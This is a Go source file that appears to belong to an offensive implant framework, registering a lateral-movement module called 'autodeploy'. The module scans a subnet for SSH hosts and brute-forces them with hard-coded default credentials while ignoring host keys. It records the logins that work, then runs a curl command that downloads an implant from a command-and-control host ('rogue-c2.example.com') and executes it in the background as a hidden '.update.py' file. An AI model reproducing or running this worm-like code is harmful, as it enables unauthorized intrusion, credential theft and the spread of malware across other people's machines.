package payloads

import (
	"fmt"
	"net"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func init() {
	Register(&AutoDeploy{})
}

type AutoDeploy struct{}

func (a *AutoDeploy) Name() string     { return "autodeploy" }
func (a *AutoDeploy) Category() string { return "lateral" }
func (a *AutoDeploy) Description() string {
	return "Auto-discover hosts via network scanning and deploy implants via SSH"
}

func (a *AutoDeploy) Execute(args map[string]string) ([]byte, error) {
	network := args["network"]
	if network == "" {
		network = "192.168.1.0/24"
	}
	implantURL := args["implant_url"]
	if implantURL == "" {
		implantURL = "http://rogue-c2.example.com/implant"
	}
	threadsStr := args["threads"]
	threads := 10
	fmt.Sscanf(threadsStr, "%d", &threads)

	result := a.deploy(network, implantURL, threads)
	return MarshalJSON(result)
}

type autodeployResult struct {
	Timestamp   string       `json:"timestamp"`
	Network     string       `json:"network"`
	Discovered  int          `json:"discovered"`
	Deployed    int          `json:"deployed"`
	Failed      int          `json:"failed"`
	Hosts       []deployHost `json:"hosts"`
	Credentials []deployCred `json:"valid_credentials,omitempty"`
}

type deployHost struct {
	IP       string `json:"ip"`
	Online   bool   `json:"online"`
	Deployed bool   `json:"deployed"`
}

type deployCred struct {
	Host     string `json:"host"`
	Username string `json:"username"`
	Password string `json:"password"`
}

var commonCreds = []struct {
	User      string
	Passwords []string
}{
	{"root", []string{"root", "toor", "admin", "password", ""}},
	{"admin", []string{"admin", "password", "123456", ""}},
	{"ubuntu", []string{"ubuntu", ""}},
	{"pi", []string{"raspberry", ""}},
	{"user", []string{"user", "123456", ""}},
}

func (a *AutoDeploy) deploy(network, implantURL string, threads int) *autodeployResult {
	r := &autodeployResult{
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Network:   network,
	}

	// Discover hosts
	hosts := discoverHosts(network)
	r.Discovered = len(hosts)
	for _, h := range hosts {
		r.Hosts = append(r.Hosts, deployHost{IP: h, Online: true})
	}

	if len(hosts) == 0 {
		return r
	}

	// Deploy to each host
	var mu sync.Mutex
	var wg sync.WaitGroup
	sema := make(chan struct{}, threads)

	for _, host := range hosts {
		sema <- struct{}{}
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			defer func() { <-sema }()

			deployed := false
			for _, cred := range commonCreds {
				if deployed {
					break
				}
				for _, pass := range cred.Passwords {
					if trySSHDeploy(ip, cred.User, pass, implantURL) {
						mu.Lock()
						r.Deployed++
						r.Credentials = append(r.Credentials, deployCred{
							Host:     ip,
							Username: cred.User,
							Password: pass,
						})
						mu.Unlock()
						deployed = true
						break
					}
					time.Sleep(100 * time.Millisecond)
				}
			}
			if !deployed {
				mu.Lock()
				r.Failed++
				mu.Unlock()
			}
		}(host)
	}
	wg.Wait()

	return r
}

func discoverHosts(network string) []string {
	var hosts []string

	// Use fping if available
	if fping, err := exec.LookPath("fping"); err == nil {
		out, err := exec.Command(fping, "-a", "-g", network, "-q").Output()
		if err == nil {
			for _, line := range strings.Split(string(out), "\n") {
				ip := strings.TrimSpace(line)
				if ip != "" {
					hosts = append(hosts, ip)
				}
			}
			if len(hosts) > 0 {
				return hosts
			}
		}
		_ = fping
	}

	// Sequential ping scan
	_, ipnet, err := net.ParseCIDR(network)
	if err != nil {
		return hosts
	}

	ip := ipnet.IP.Mask(ipnet.Mask)
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		if ip.IsLoopback() || ip.Equal(ipnet.IP.Mask(ipnet.Mask)) {
			continue
		}
		// Quick port check on 22
		addr := fmt.Sprintf("%s:22", ip.String())
		conn, err := net.DialTimeout("tcp", addr, 500*time.Millisecond)
		if err == nil {
			conn.Close()
			hosts = append(hosts, ip.String())
		}
		if len(hosts) >= 50 {
			break
		}
	}

	return hosts
}

func trySSHDeploy(host, username, password, implantURL string) bool {
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	addr := fmt.Sprintf("%s:22", host)
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return false
	}
	defer client.Close()

	// Execute download and run
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := fmt.Sprintf("curl -s %s -o /tmp/.update.py && python3 /tmp/.update.py &", implantURL)
	session.Run(cmd)

	return true
}

var _ = filepath.Join
